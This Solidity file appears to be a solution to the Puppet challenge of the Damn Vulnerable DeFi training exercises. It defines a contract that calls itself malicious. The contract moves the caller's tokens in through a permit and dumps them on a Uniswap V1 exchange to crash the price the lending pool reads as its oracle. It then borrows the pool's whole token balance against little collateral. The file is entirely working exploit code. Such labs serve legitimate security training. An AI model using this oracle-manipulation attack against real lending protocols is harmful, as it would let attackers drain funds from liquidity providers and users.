// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {PuppetPool} from "./PuppetPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {console} from "hardhat/console.sol";

interface IUniswapV1Exchange {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

/**
 * @title PuppetPoolAttack
 * @dev A malicious contract that attacks PuppetPool
 */
contract PuppetAttack {
    DamnValuableToken public immutable token;
    PuppetPool public immutable pool;
    IUniswapV1Exchange public immutable uniswapExchange;

    constructor(
        address tokenAddress,
        address poolAddress,
        address uniswapExchangeAddress,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) payable {
        token = DamnValuableToken(tokenAddress);
        pool = PuppetPool(poolAddress);
        uniswapExchange = IUniswapV1Exchange(uniswapExchangeAddress);

        token.permit(msg.sender, address(this), type(uint256).max, type(uint256).max, v, r, s);
        token.transferFrom(msg.sender, address(this), token.balanceOf(msg.sender));

        token.approve(address(uniswapExchange), type(uint256).max);
        uniswapExchange.tokenToEthSwapInput(token.balanceOf(address(this)), 1, 9999999999);

        uint256 poolBalance = token.balanceOf(address(pool));
        uint256 depositRequired = pool.calculateDepositRequired(poolBalance);

        if (msg.value < depositRequired) {
            revert("Not enough collateral");
        }

        pool.borrow{value: msg.value}(poolBalance, msg.sender);
    }
}
